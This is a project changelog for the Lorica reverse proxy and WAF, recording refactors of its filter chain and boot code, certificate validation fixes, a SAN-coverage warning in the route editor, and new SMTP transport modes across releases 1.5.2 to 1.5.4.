# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/),
and this project adheres to [Semantic Versioning](https://semver.org/).

Author: Rwx-G

## [Unreleased]

### Fixed

- v1.5.2 forensics-trail wipe rate limit (RL_LOGS_CLEAR=1 per 60s) shared the bucket name `"logs_clear"` between two unrelated DELETE endpoints (`/api/v1/logs` and `/api/v1/waf/events`). An admin doing post-incident cleanup that called both within 60s would get a silent 429 on the second call. Surfaced by IV2 e2e harness during the Story 8.1 audit pass. Fix : give `clear_waf_events` its own bucket name `"waf_events_clear"` ; per-endpoint buckets keep the per-call security cap intact while letting legitimate cleanup sequences proceed. (Story 8.1 audit / Epic 8)
- `tests-e2e-docker/run.sh` teardown did not include `--profile workers` and `--profile cert-export`, so the profile-only named volumes (`lorica-cert-export-data`, `shared-cert-export`, `lorica-workers-data`, `shared-workers`) survived across `down -v` and the next run booted against stale state. The cert-export smoke fails with a 401 on the second run because the lorica-cert-export DB has the changed admin password while `/shared/admin_password` still holds the original first-boot value. Fix : enable both profiles on the closing `down -v`. Surfaced by IV2 e2e harness during the Story 8.1 audit pass. (Story 8.1 audit / Epic 8)
- Workers mode silently dropped scheduled load tests : `lorica_bench::scheduler::start_scheduler` was wired only by the single-process boot path, so cron-scheduled load test configs never auto-fired under `--workers N`. Surfaced by the Story 8.1 `spawn_control_plane_tasks` extraction (the asymmetry became obvious once the shared spawn surface was factored). Wired in `run_supervisor` so both modes behave identically. Same v1.5.2-style "one role missed a spawn the other roles already had" pattern as the worker-mode cert hot-reload bug. (Story 8.1 / Epic 8)
- Single-process did not rebuild the notify dispatcher on config reload : its reload listener only refreshed proxy config, cert resolver, probe scheduler, and SLA configs. Dashboard edits to notification channel configs (email / webhook / slack) silently required a full restart to take effect. Added the dispatcher rebuild inside the existing reload listener block, mirroring the supervisor's wiring. Also surfaced by the Story 8.1 extraction. (Story 8.1 / Epic 8)
- Fixed : the `Retry-After` and `X-RateLimit-Reset` headers used to be conditionally attached at only some of the rate-limit / maintenance-mode error-response sites, with the rest silently dropping them (v1.5.2 audit H-10 bundled into backlog #7). The new `write_decision()` helper accepts an `extra_headers` parameter that makes the per-site policy explicit at the call site, restoring `Retry-After` on every rate-limit reject and on the maintenance-mode 503. (Story 8.1 / Epic 8)

### Changed

- Refactor : `lorica/src/main.rs` `run_supervisor` and `run_single_process` no longer duplicate the ~75 LOC of control-plane spawn wiring (IP blocklist refresh, notify dispatcher build, persisted alert dispatcher, active probe scheduler, SLA collector + flush task, load-test engine handle, hourly retention sweep). Both call paths now go through one `spawn_control_plane_tasks` helper at `lorica/src/startup/control_plane.rs` that returns a `ControlPlaneHandles` struct. Worker mode is untouched (it runs a leaner data-plane subset factored separately, see next entry). Behaviour-preserving extraction with two follow-up `fix(...)` commits closing pre-existing v1.5.2-style asymmetries surfaced in the process. 268 lorica unit tests, clippy `--no-deps` clean. (Story 8.1 / Epic 8)
- Refactor : `lorica/src/main.rs` `run_worker` and `run_single_process` no longer duplicate the data-plane resolver-handle setup (GeoIP + ASN handle registration, rDNS resolver init from system `resolv.conf`) or the three lazy-prune background spawns (basic-auth verification cache, per-IP rate-limit buckets, bot challenge stash). Both paths now go through `init_data_plane_handles(proxy, role)` and `spawn_data_plane_pruners(proxy, task_tracker)` at `lorica/src/startup/data_plane.rs`. The GeoIP / ASN DB file load stays role-specific (worker loads inline from settings ; single defers to `apply_supervisor_settings_from_store`) and the divergence is documented at both call sites. This is the helper that would have prevented the v1.5.2 worker-mode cert hot-reload bug pattern : with both branches going through one function, future spawn-asymmetry regressions of that shape are caught at extraction time instead of in production. 268 lorica unit tests, clippy `--no-deps` clean. (Story 8.1 / Epic 8)
- Refactor : `lorica/src/main.rs` shrunk by ~140 LOC by extracting the per-subcommand CLI handlers (`rotate-key`, `unban`) into `lorica/src/cli/{rotate_key, unban}.rs` and the three independent boot helpers (the ~150 LOC tracing subscriber + rolling-file appender + reloadable OTel bridge, the SIGTERM/SIGINT shutdown await, the `try_init_from_settings` OTel boot reader) into `lorica/src/startup/{logging, signals, otel}.rs`. main.rs becomes a thinner dispatch shell ; each helper stays testable in isolation. No behaviour change. (Story 8.1 / Epic 8)
- Refactor : `lorica/src/main.rs` shrunk by another ~165 LOC by extracting the three notification helpers (`build_notify_dispatcher`, `spawn_persisted_alert_dispatcher`, `run_sla_purge`) into `lorica/src/startup/notify.rs`. `startup/control_plane.rs` now calls them through their owning module instead of traversing the crate root via `crate::xxx`. main.rs total reduction across Story 8.1 commits A through D : 555 LOC (4600 → 4045). No behaviour change. (Story 8.1 / Epic 8)
- Refactor : `lorica/src/proxy_wiring.rs` shrunk by ~310 LOC by extracting the three load-balancing primitives (`SmoothWrrState`, `EwmaTracker`, `CircuitBreaker` + state enums) into a dedicated `lorica/src/proxy_wiring/lb.rs` module. The same re-export pattern as the v1.5.2 engines.rs extraction keeps `lorica::proxy_wiring::EwmaTracker` etc. callable unchanged. Three small utility helpers (`compute_pool_size`, `ip_to_shmem_key`, `ip_matches`) folded into the existing `proxy_wiring/helpers.rs` module. (Story 8.1 / Epic 8)
- Refactor : new `write_decision()` helper at `lorica/src/proxy_wiring/error_pages.rs` deduplicates the 17 (now 18) error-response sites in `request_filter` and `request_body_filter` that all repeated the same five-step `extract_host` -> `render_error_body` -> `ResponseHeader::build` -> `insert Content-Type / Content-Length` -> `write_response_header + write_response_body + Ok(true)` pattern. proxy_wiring.rs net change : -284 LOC. (Story 8.1 / Epic 8)
- Refactor : `lorica/src/proxy_wiring.rs` shrunk by ~130 LOC by extracting the per-request `RequestCtx` struct (~135 LOC of pub fields documented one-by-one) into a dedicated `lorica/src/proxy_wiring/context.rs` submodule. Re-exported as `pub(crate) use context::RequestCtx;` so existing call sites (request_filter, upstream_peer, logging, etc.) keep resolving unchanged. (Story 8.1 / Epic 8)
- Refactor : `lorica/src/proxy_wiring.rs` shrunk by another ~490 LOC by extracting the routing surface (`RouteEntry`, `MtlsEnforcer`, `ProxyConfig`, `ProxyConfigGlobals`, and the entire `impl ProxyConfig` block carrying `from_store` + `find_route`) into a dedicated `lorica/src/proxy_wiring/routing.rs` submodule. Re-exported via `pub use routing::{...}` so external callers continue resolving `lorica::proxy_wiring::ProxyConfig` etc. unchanged. proxy_wiring.rs total reduction across Story 8.1 commits E1 through E4 : 1090 LOC (5440 -> 4350). (Story 8.1 / Epic 8)
- Refactor : `request_filter` decomposition (Story 8.1 AC #5 strict closure). The 1664-LOC inline filter pipeline is now a sequence of `if let Some(d) = self.check_X(session, ctx).await? { return write_decision(session, &ctx.request_id, d).await; }` calls into 16 dedicated `check_<name>` methods, each returning `Option<Decision>` (sync) or `Result<Option<Decision>>` (async). The 15 helpers fired in `request_filter` plus `check_waf_body_filter` in `request_body_filter` cover every early-return site that previously lived inline : check_global_connection_limit, check_ip_banned, check_ip_blocked, check_websocket_disabled, check_token_bucket_rate_limit, check_mtls, check_forward_auth, check_maintenance_mode, check_return_status, check_ip_allow_deny, check_geoip, check_slowloris, check_route_conn_limit, check_legacy_rate_limit, check_waf_request_filter, check_waf_body_filter. The four sites that initially resisted clean extraction (return_status with redirect_to passthrough, legacy rate_limit_rps with auto-ban escalation, WAF block with shmem / per-process auto-ban escalation, async forward_auth Allow / Deny / FailClosed translation) closed cleanly once the `Decision` struct grew two extra constructors (`Decision::redirect(status, location)` for header-only `Location:` redirects ; `Decision::passthrough(status, headers, body)` for forward-auth Deny verbatim forwarding) and one variant (`DecisionBody::Custom(Vec<u8>)` for owned body bytes). The `extra_headers: Vec<(Cow<'static, str>, String)>` change from `&'static str` keys to `Cow` accepts both static literals (Retry-After, X-RateLimit-Reset) and owned strings (forward-auth response_headers sourced at runtime). The `Decision` builder API at proxy_wiring/error_pages.rs replaces the previous five-parameter call signature ; `write_decision` is the single sink for every error-response site. (Story 8.1 / Epic 8 / AC #5 strict)
- Refactor : `proxy_wiring/filters/` per-concern split (Story 8.1 AC #4 strict closure). The 16 `check_<name>` helpers extracted from `request_filter` (AC #5) now live in 7 per-concern submodules instead of one monolithic `checks.rs`, each holding a coherent slice of the filter chain : `connection.rs` (process-wide + per-route active-connection caps, WebSocket gate, slowloris detection - 4 helpers), `ip.rs` (auto-ban table lookup, WAF IP blocklist, per-route allow / deny - 3 helpers), `rate_limit.rs` (token-bucket `RateLimit` and legacy `rate_limit_rps` paths - 2 helpers), `auth.rs` (mTLS enforcement and forward-auth sub-request dispatch - 2 helpers), `waf.rs` (header-phase + body-phase WAF eval, includes shmem / per-process auto-ban escalation - 2 helpers), `geoip.rs` (country resolution + per-route allow / deny - 1 helper), `route_directive.rs` (maintenance mode + return_status with optional `Location:` redirect - 2 helpers). The original AC envisioned `filters/{cache, waf, rate_limit, forward_auth, bot}.rs` ; the practical mapping shipped here covers the same intent with concrete concerns from the actual implementation (no cache helpers exist as inline filter checks ; no bot challenge gate runs in the same dispatch shape). All seven files attach to `LoricaProxy` via separate inherent `impl` blocks - the type stays a single inherent type at the type-system level while each file holds its own unbounded `use` set without polluting siblings. The top-level `request_filter` continues to read as a flat sequence of `if let Some(d) = self.check_X(...)? { return write_decision(session, &ctx.request_id, d).await; }` calls, one per helper. proxy_wiring.rs root LOC unchanged from the previous AC #4 commit (the split is internal to the filters/ subtree). 268 lorica unit tests, clippy `--no-deps` clean. (Story 8.1 / Epic 8 / AC #4 strict)
- Story 8.1 AC #8 dispatch order regression pin (closes the QA review VERIFY-001 concern). New `dispatch_order_locked` test in `lorica/src/proxy_wiring/tests.rs` parses `proxy_wiring.rs` at compile time via `include_str!`, extracts every `self.check_<name>(` call site (in source order, comments and prose references filtered out), and asserts the sequence equals the 16-helper canonical order documented in the Story 8.1 PRD AC #8 + the CHANGELOG AC #8 verification entry. The check that closed Story 8.1 was a one-shot grep + line-number ordering at review time ; this test makes the same invariant a mechanical CI gate so any future refactor that reorders, drops, renames, or adds a `check_<name>` helper fails the suite with a named regression message instead of silently shipping a behaviour drift. The test is hermetic (compile-time `include_str!`, no FS I/O at run time) and adds zero runtime cost to non-test builds. (Story 8.1 / Epic 8 / AC #8 / QA VERIFY-001)
- Verification : Story 8.1 AC #8 closure - mechanical behaviour-preservation check across the entire epic. Source-level token-stream parity check between `bd4219b` (Story 8.1 base) and HEAD : nine production side-effect call sites count-equal across the two trees - `persist_waf_event` (7 = 7), `record_waf_event` (6 = 6), `inc_geoip_block` (1 = 1), `AlertType::IpBanned` (3 = 3), `AlertType::WafAlert` (2 = 2), `rate_limiter.observe` (1 = 1), `forward_auth_inject` set (1 = 1), `ip_blocklist().is_blocked_str` (1 = 1), `record_blocklist_event` (1 = 1). The four counts that DO drift drift in the expected direction : `Decision::reject / redirect / passthrough` jump from 0 to 23 (the new builder API replaces the inline 5-step `extract_host` -> `render_error_body` -> `ResponseHeader::build` -> `insert Content-Type / Length` -> `write_response_header + write_response_body` pattern at every error-response site ; the underlying `write_decision()` body emits the same byte sequence per-status as the inline pattern did at bd4219b), `insert_header(` falls from 63 to 51 (the consolidation of 17 inline error-response sites into one `write_decision` helper drops the per-site `Content-Type` + `Content-Length` pair, net -12 - the helper still emits both headers, just from one shared site), `ResponseHeader::build` falls from 30 to 21 (same consolidation : 9 inline sites collapsed), and `ban_list.insert` rises from 3 to 9 (3 production sites preserved 1-to-1 ; 6 NEW test-side inserts in `proxy_wiring/tests.rs` are the audit M-22 cert-reload regression suite added during the v1.5.2 cycle, no production-path drift). Filter-chain dispatch ORDER preserved verbatim across the extraction : the 15 `check_<name>` calls in `request_filter` fire in the same sequence as the bd4219b inline checks (global_connection_limit -> ip_banned -> ip_blocked -> websocket_disabled -> token_bucket_rate_limit -> mtls -> forward_auth -> maintenance_mode -> return_status -> ip_allow_deny -> geoip -> slowloris -> route_conn_limit -> legacy_rate_limit -> waf_request_filter), with `check_waf_body_filter` running in `request_body_filter` exactly as `evaluate_body` did inline at bd4219b. Cross-validation : 268 lorica unit tests pass on HEAD ; the same suite passed on bd4219b before any extraction work began. The Story 8.1 epic is closed in full (AC #1, #3, #4 strict, #5, #8). (Story 8.1 / Epic 8 / AC #8)
- Refactor : `run_supervisor` decomposition (Story 8.1 AC #1+#3 strict closure). Five supervisor boot daemons moved out of run_supervisor into dedicated `lorica/src/startup/` modules : `waf_uds.rs` (worker -> supervisor WAF event listener over UDS, ~138 LOC), `log_uds.rs` (worker -> supervisor LogBuffer forwarder over UDS, ~40 LOC), `shmem_eviction.rs` (cross-worker shared-region eviction walker, ~25 LOC), `api_server.rs` (~60 LOC + ACME auto-renewal + cert-expiry notifier wiring, shared between supervisor and single-process boot paths so worker-mode and single-process never drift on which renewal task they spawn), and `worker_monitor.rs` (~260 LOC : crash detection, exponential-backoff respawn, post-respawn RPC re-registration via `spawn_supervisor_rpc_handler`, post-respawn legacy command-channel re-spawn for ban / reload / heartbeat / metrics-pull). The 14 supervisor-owned handles the monitor needs (manager, reload_tx, ban_tx, sequence, hb_metrics, agg_metrics, task_handles, rpc_endpoints, rl_registry, rl_policy, store, verdict_cache, breaker_registry, shutting_down) bundle into one `WorkerMonitorDeps` struct so the public `spawn_worker_monitor(deps)` signature stays readable. `SupervisorVerdictCache`, `SupervisorBreakerRegistry`, and `spawn_supervisor_rpc_handler` opened from private to `pub(crate)` so the new module under `startup/` can reference them through the binary crate root (the startup tree is binary-private, declared via `mod startup;` in main.rs - the library does not expose it). run_supervisor net : -555 LOC over the five extractions ; the supervisor boot path now reads as a flat sequence of helper calls. 268 lorica unit tests, clippy `--no-deps` clean. (Story 8.1 / Epic 8 / AC #1+#3 strict)

## [1.5.4] - 2026-04-29

### Added

- Issue #11 (route editor / TLS cert SAN cross-check) : the Routing tab in the route drawer now flags a non-blocking warning when the selected certificate's SAN list does not cover the route's `hostname` or any of its `hostname_aliases`. Pre-fix the mismatch was only visible at runtime as a TLS handshake failure (`SSL_ERROR_BAD_CERT_DOMAIN` browser-side, `unknown certificate` worker-side) ; an operator who picked the wrong cert would not learn about it until a real client tried to reach the route. The check runs RFC 6125 strict matching - the same rules Chrome / Firefox / Safari enforce on the live handshake - so a "covered" verdict in the editor predicts a successful handshake, and an "uncovered" verdict predicts a real failure rather than a guess that can diverge from the browser. Specifically : exact match (case-insensitive, trailing-dot tolerant), wildcard match where `*.example.com` covers exactly one subdomain label (so `pki.example.com` is in, `a.b.example.com` and the bare apex `example.com` are out), partial-label wildcards like `pki*.example.com` rejected as ambiguous (Chrome / Firefox both reject these). The warning is rendered in the existing `warn-banner` style under the cert select with the offending hostname(s) named and the cert's SAN list echoed for context. Save remains allowed - a wildcard or multi-SAN cert that the operator knows covers the host can still be saved without friction. New `lib/cert-san-match.ts` (3 exports : `hostnameMatchesSan`, `hostnameCoveredByAny`, `findUncoveredHostnames`) + 23 vitest cases pinning the contract (exact, wildcard single-label, apex rejection, multi-label rejection, partial-label rejection, case-insensitive, trailing-dot, label-boundary straddle, empty inputs, deduplication). No backend change : the `CertificateResponse.san_domains` field already carried the SAN list since v1.5.3 SAN extraction. 343 frontend tests green (was 320).

## [1.5.3] - 2026-04-28

### Changed

- **v1.5.3 behavior change at the certificate-API boundary** : every cert-storing endpoint (`POST /api/v1/certificates`, `PUT /api/v1/certificates/{id}`, `POST /api/v1/config/import`) now validates the `(cert_pem, key_pem)` bundle with `lorica_tls::validate_certificate_bundle` before persisting. Bundles that previously succeeded but silently broke at handshake time (cert and key from two different keypairs - the v1.5.2 incident shape) now reject with HTTP 400 carrying the rustls SPKI-mismatch diagnostic, AND bundles whose `cert_pem` or `key_pem` cannot be parsed at all (the original v1.5.2 incident's first-pass shape - non-PEM payload pasted into `key_pem`) reject with HTTP 400 carrying the offending `BEGIN` line in the diagnostic. This is strictly stricter than v1.5.2 ; an upgrade from v1.5.2 to v1.5.3 cannot break a production workload because the only newly-rejected uploads are the ones that already would have failed at TLS handshake time, but a CI pipeline that scripted cert uploads with bogus PEMs (some test harnesses do) will now see 400 where v1.5.2 returned 201. The rejection metric (`lorica_certificates_invalid_bundle_total{source="upload"}`) stays at 0 in steady state on a well-behaved deployment ; non-zero is informational (a paste error caught at the boundary, no fleet impact). The companion `source="reload"` increment flags a pre-existing broken row that was tolerated by the worker resolver - that one IS alertable.

### Fixed

- v1.5.3 (cert resolver tolerance + PEM loader hardening) : a single corrupted row in the `certificates` table (truncated key blob, mismatched cert/key pair, or the original incident shape - a non-PEM payload landed in `key_pem` by an upload paste error such as a CSR pasted into the private-key field) used to bring every TLS-terminated vhost down at once. Root cause : `lorica-tls/src/cert_resolver.rs::CertResolver::reload` (the worker-side resolver populator called both at boot via `lorica/src/main.rs:2906-2930` and on every hot reload via `lorica/src/reload.rs::reload_cert_resolver`) walked the cert batch with `?` so the first `build_certified_key` failure short-circuited the whole loop, the resolver stayed empty, and every subsequent TLS handshake regardless of SNI failed with `no server certificate chain resolved` (`lorica-core/src/services/listening.rs:218`). The matching WARN in the worker log named only "no private key found in PEM" without the originating row, so the operator-visible blast radius was every vhost on the listener while the diagnostic pointed at none of them specifically. Fix : per-cert errors are now logged with the originating `domain` field and skipped ; the resolver populates with every other valid cert in the same batch. An operator-facing aggregate WARN (`{skipped}/{total} certificate(s) skipped due to load errors`) makes the partial-loading state visible in `journalctl` without per-domain grepping. **Companion** (PEM loader hardening) : `parse_key_from_pem` previously called `PrivateKeyDer::from_pem_slice` directly. Upstream pki-types 1.14 already accepts PKCS#8 / PKCS#1 RSA / SEC1 EC at that entry point, but on a malformed input the diagnostic was an opaque `NoItemsFound`. Centralised in `lorica-tls/src/lib.rs::load_first_private_key` with an explicit per-format fallback (PKCS#8 -> PKCS#1 -> SEC1) and a 'first BEGIN line' diagnostic on total failure ; an operator who pastes a CSR / public key / wrong PEM kind into the `key_pem` field now sees the offending header echoed in the error message instead of the generic `no items found`. The three call sites (cert_resolver `parse_key_from_pem`, `load_certs_and_key_files`, `load_pem_file_private_key`) share the same loader. Tests : 4 new in `cert_resolver::tests` (PKCS#8 RSA load, PKCS#1 RSA load, SEC1 EC load, partial-tolerance regression) plus 3 new fixtures (`test-cert-rsa.pem`, `test-key-rsa-pkcs1.pem`, `test-key-rsa-pkcs8.pem` - generic test.example.com self-signed pair, no operator data). 32 lorica-tls tests green ; the partial-tolerance regression pin makes a future drop of the skip-and-log behaviour fail the suite with a named regression test.
- v1.5.3 (cert/key matching invariant at upload) : every cert-storing API endpoint now rejects a bundle whose `cert_pem` and `key_pem` parse cleanly on their own but come from two different keypairs - this was the second-pass failure mode of the same v1.5.3 incident, after the operator worked around the original bad-row poisoning by re-uploading and accidentally landed the wrong key alongside the right cert in the same row. Without this check, the row encrypted cleanly into the database, every PEM parser was happy, but at handshake time the worker presented the leaf cert and signed the `CertificateVerify` with the public-key-mismatching key ; clients closed the handshake with a TLS `DecryptError` alert (alert code 51) and the server logged only `received fatal alert: DecryptError` (`lorica-core/src/services/listening.rs:218`) with no usable diagnostic. The visible symptom on the operator side was browser-level `nssBadCert` / `SEC_ERROR_BAD_SIGNATURE` with no entry in the worker log naming the offending row. New `lorica_tls::validate_certificate_bundle` (`lorica-tls/src/lib.rs`) builds a rustls `CertifiedKey` from the bundle and calls `CertifiedKey::keys_match()` which compares the leaf's `SubjectPublicKeyInfo` against the public key derived from the signing key. Wired into `lorica-api/src/certificates.rs::validate_certificate_bundle` and called by every cert-mutating site : `POST /api/v1/certificates`, `PUT /api/v1/certificates/{id}` (revalidates the full resulting bundle whenever either field is touched, by combining the new field with the existing field read from the store), and `POST /api/v1/config/import` (per-cert with the originating `domain` prefixed in the error message). The 400 response carries the rustls diagnostic verbatim ('certificate and private key do not form a matching pair (SubjectPublicKeyInfo mismatch)') so a paste error is rejected at the API boundary instead of surfacing later as opaque handshake failures. Tests : 2 new in `cert_resolver::tests` (matching pair accepted, mismatched pair rejected with a SPKI-mismatch diagnostic) plus a 4th fixture (`test-key-rsa-pkcs1-other.pem`, second RSA-2048 keypair to exercise the mismatch path). New `lorica-api -> lorica-tls` workspace dep added so the API uses the same loader as the runtime - by construction, no PEM bundle the API accepts can fail at worker load OR at handshake-signature time. **Followup note** : the validation runs on every new upload but does NOT retro-check existing rows in the database. The closed-loop story is : (a) the resolver-tolerance work above absorbs pre-v1.5.3 broken rows at boot / hot reload by skipping them with a per-row WARN naming the originating `domain`, and (b) the new `lorica_certificates_invalid_bundle_total{source="upload"|"reload"}` Prometheus counter (`lorica-api/src/metrics.rs`) makes both states visible to alerting : `source="upload"` is informational (the API caught a paste error - no fleet impact), `source="reload"` is alertable (a row already in the DB broke the resolver's load path and that domain is now NOT served by TLS termination on the affected worker). Operators who hit the v1.5.3 incident before upgrading no longer need to manually inspect resolver WARN logs - a non-zero `source="reload"` rate after upgrade pins the legacy row that needs re-uploading.

## [1.5.2] - 2026-04-24

### Added

- Email notification channel now supports three SMTP transport modes via the new `smtp_encryption` field : `"starttls"` (plaintext then STARTTLS upgrade, typical port 587 - default, matches pre-v1.5.2 behaviour so existing configs are untouched), `"tls"` (implicit TLS / SMTPS, typical port 465), `"none"` (plaintext, typical port 25). The previous code path hardcoded `AsyncSmtpTransport::<Tokio1Executor>::starttls_relay(...)` which forces STARTTLS negotiation on every connection, so operators running a LAN MTA relay on port 25 (Postfix, sendmail, Docker mailhog, corporate SMTP gateways that do not advertise STARTTLS) could not wire Lorica alerts through it - the transport builder itself rejected the shape before any network call. `"none"` routes through `builder_dangerous(host)` (lettre 0.11 name for the unencrypted path) ; `"tls"` routes through the plain `relay(host)` variant. When `smtp_port` is unset the sender now falls back to 587 / 465 / 25 respectively, so the happy path is zero-config once the operator picks the encryption mode. Credentials (`smtp_username` + `smtp_password`) still layer on top of any of the three transports when both are set, matching SMTP AUTH over the chosen channel. Reported by a new production client : "pas possible d'avoir un unidentified sur port 25 pour le sendmail". Dashboard form (`SettingsNotifications.svelte`) gained an `Encryption` dropdown above the port field with a contextual help hint that flips per-selection - the `"none"` hint calls out the plaintext risk. Pre-v1.5.2 stored configs (JSON blob without the field) deserialise to `Starttls` via `#[serde(default)]` so no DB migration is needed and every operator keeps the same transport behaviour after upgrade. Unknown values (`"ssl"` typo etc.) are rejected with a clear serde error instead of silently falling back to the default. 6 new unit tests : default-port-per-encryption (x3), backward-compat JSON without the field, `"none"` + `"tls"` parsing, unknown value rejected, plaintext transport build (regression pin : the shape the production bug ran into no longer fails at transport-build time), implicit-TLS transport build.

### Changed

- v1.5.2 audit M-22 (test coverage) : three white-box regression tests added against `proxy_wiring::handle_config_reload_commit` (the worker-side handler for the two-phase RPC commit) - the function whose missing `reload_cert_resolver` call was the v1.5.2 worker-mode cert hot-reload bug. Tests are in a new `lorica/src/proxy_wiring/cert_reload_commit_tests.rs` module and exercise the handler directly with a populated in-memory `ConfigStore` + a fresh empty `CertResolver`. **Test 1 (the regression pin)** : seed a self-signed cert via `rcgen` + a route that references it, run a `ConfigReloadCommit` RPC for generation 1, assert `cert_resolver.domain_count() == 1` afterwards. Pre-fix this assertion would have failed (`domain_count == 0`) ; post-fix the cert appears in the resolver. The test message names the regression explicitly so a future drop of the `reload_cert_resolver` call surfaces with a clear "v1.5.2 audit M-22 regression" failure. **Test 2 (active-cert filter pin)** : seed an orphan cert (no route references it), commit, assert `domain_count == 0` - pins `reload_cert_resolver`'s `active_cert_ids` filter so a future "load all certs" change cannot accidentally tip stale or disabled certs into the live TLS stack. **Test 3 (gate short-circuit pin)** : observe gate at generation 5, commit generation 1, assert `domain_count == 0` AND the reply is `Error` - pins the `gate.observe_commit` short-circuit so an out-of-order or duplicate commit cannot ArcSwap stale state on top of fresher state. Driving the handler from a test required exposing a constructor : `IncomingCommand::for_test(cmd, tx_out)` added to `lorica-command/src/rpc.rs` (marked `#[doc(hidden)]` because it bypasses the normal `RpcEndpoint` dispatch path - production code must construct `IncomingCommand` only via the reader loop in `RpcEndpoint::new`). 268 lorica tests + 44 lorica-command tests green (was 265 + 44 before the new fixture). Closes audit M-22 / backlog #35 for the cert-hot-reload surface ; the SMTP-encryption-modes coverage M-22 also flagged is already shipped in `lorica-notify::channels::email::tests` (default-port-per-mode + plaintext / TLS / STARTTLS builder regression tests, 12 cases). The ACME-renewal-in-worker-mode surface M-22 also flagged stays open as a Pebble-fixture e2e item in the backlog ; the cert-hot-reload regression test transitively covers the same RPC path that ACME renewal uses, so the marginal value is lower.
- v1.5.2 audit M-23 (code quality) : three near-identical RFC-1123 hostname-validator loops in `lorica-api/src/routes/crud.rs` (`validate_redirect_hostname` at the redirect-target site, `validate_hostname_alias` at the SNI-alias site, plus an inline label loop the audit also flagged) folded into a single `validate_dns_hostname(raw, HostnameOpts { allow_wildcard, allow_empty, field_label })` helper. Both surviving callers (`validate_redirect_hostname`, `validate_hostname_alias`) become 9-line wrappers that delegate. The `HostnameOpts` knobs cover the only real differences between the two: alias accepts `*.example.com` (SNI wildcard) but redirect doesn't, and redirect treats empty-after-trim as "clear the field" while alias treats it as a validation error. A future change ("accept IPv6 literals in brackets", "raise the 63-char label cap", "tighten the alphabet") now needs ONE edit instead of two-or-three synchronised edits ; copy-paste drift between the two surfaces is no longer possible. While in there, an orphaned doc-comment block (the `redirect_hostname` preamble that had been silently stuck to `validate_group_name` since a previous refactor) was deleted - the wrappers carry their own docs now. Behaviour preserved at byte-level for the existing test surfaces (453 lorica-api tests green : the `redirect_hostname_validation_tests` + `hostname_alias_tests` modules pin the byte-for-byte error messages and accepted shapes that the dashboard depends on). Closes audit M-23 / backlog #36.
- v1.5.2 audit L-23 + L-24 (code quality) : ~50 inline magic numbers in `lorica-api/src/server.rs` body limits (`bl(128 * 1024)`) + rate-limit windows (`rl("name", 100, 60)`) lifted to a `pub const` block at the top of the file (`RL_WINDOW_S`, `BODY_CAP_DEFAULT/PEM/WAF_RULE/REAPPLY/CONFIG_IMPORT/ACME/SETTINGS`, `RL_CERT_CREATE/...`). The policy is now visible on one screen instead of scattered across 600 lines ; tuning a single window or cap is a single-edit ; drift between similar endpoint groups is no longer possible. Same shape applied to the API limits in `lorica-api/src/routes/crud.rs` (`RATE_LIMIT_MAX`, `BOT_COOKIE_TTL_MAX`, `BOT_POW_DIFFICULTY_MIN/MAX`, `BOT_CAPTCHA_ALPHABET_MIN/MAX`, `BOT_MAX_BYPASS_ENTRIES_PER_CATEGORY`) - operators saw the bound in error messages but the OpenAPI generator / SDK builders had no way to read them.
- v1.5.2 pre-release clippy cleanup pass : six clippy::all warnings landed earlier on the branch were not surfaced by the per-commit `cargo check` workflow (they only fire under `cargo clippy --tests`). Cleaned up before the bump so the release ships a clean lint baseline. (a) `drop_non_drop` on instant-acme `Authorizations<'_>` in `acme/http01.rs` + `acme/dns01_manual.rs` (introduced by audit L-15) : `drop(authorizations)` was a no-op (the type carries no `Drop` impl) ; replaced with `let _ = authorizations;` so NLL releases the borrow on `order` for the next mut call. (b) `doc_lazy_continuation` x4 in `cert_export.rs` (audit M-9), `proxy_wiring.rs` (audit L-6 helper), `bot_rdns.rs` (audit L-10), `health.rs` (audit M-10) - reflowed multi-line doc comments where a leading `-` or backtick at column 5 was being parsed as a list-item continuation marker. (c) `unnecessary_sort_by` in `cert_resolver.rs` (audit L-16) : `sort_by(|a, b| b.x.cmp(&a.x))` -> `sort_by_key(|e| std::cmp::Reverse(e.x))`. (d) `dead_code` on `WafEngine::url_decode` legacy alias (audit H-4) : production code migrated to the explicit `*_uri` / `*_form` variants ; only tests still called the alias. Migrated the 8 test sites to `url_decode_form` (form behaviour was the legacy default) and removed the alias + the legacy-equivalence test. `cargo clippy --tests --no-deps -- -D warnings` now passes on lorica + lorica-api + lorica-notify + lorica-config + lorica-waf + lorica-tls. Process improvement candidate : add the same clippy invocation to the per-commit CI gate so this class does not accumulate again - tracked as a v1.6.0 backlog item.
- v1.5.1 audit M-7 (backlog #23) : six SQLite read / clear handlers in `lorica-api` ran their `LogStore` calls inline inside `pub async fn` bodies. The store methods are sync (`pub fn query(...)`, `lorica-api/src/log_store.rs:155`) and acquire `parking_lot::Mutex<rusqlite::Connection>` ; with WAL + `busy_timeout=5000`, a contended writer in another worker (the proxy access-log path inserts on every request) could stall the tokio reactor for up to 5 seconds, freezing every other handler bound to the same runtime. Six call sites migrated to `tokio::task::spawn_blocking({ let store = Arc::clone(store); move || store.<method>(...) }).await` : `get_logs` (`logs.rs:181`), `export_logs` (`logs.rs:331`), `clear_logs` (`logs.rs:451`), `get_waf_events` (`waf.rs:67`), `get_waf_stats` (`waf.rs:108`), `notification_history` (`settings.rs:688`, two calls fused in one closure since they share the same store handle). `LogsQuery` gained `#[derive(Clone)]` so the params can move into the closure while the surrounding `if let / else` still has the original binding for the in-memory fallback path. Two-tier `?` on every site : the outer `JoinError` becomes an `ApiError::Internal` with a "join failed" prefix so a runtime-shutdown blocking-task abort surfaces distinctly from the SQLite-side error. Behaviour-preserving for healthy traffic ; the blast radius of a stalled SQLite write collapses from "every API handler" to "the one handler that asked for the read". Same pattern that `lorica-api/src/acme/store.rs:120-132` already used. 442 lorica-api tests + the lorica suite stay green.
